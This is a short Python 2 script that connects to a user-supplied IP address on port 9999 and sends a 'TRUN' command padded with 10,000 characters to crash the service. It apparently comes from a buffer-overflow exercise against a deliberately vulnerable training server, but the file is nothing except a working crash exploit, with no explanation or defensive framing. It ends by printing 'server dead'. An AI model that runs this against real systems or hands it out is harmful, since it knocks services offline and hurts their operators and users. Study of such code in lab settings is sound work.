import socket 
IP = raw_input("enter the IP to crash:") 
PORT = 9999 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((IP,PORT)) 
banner = s.recv(1024) 
print(banner) 
command = "TRUN " 
header = "|/.:/" 
buffer = "Z" * 10000 
s.send (command + header + buffer) 
print ("server dead")
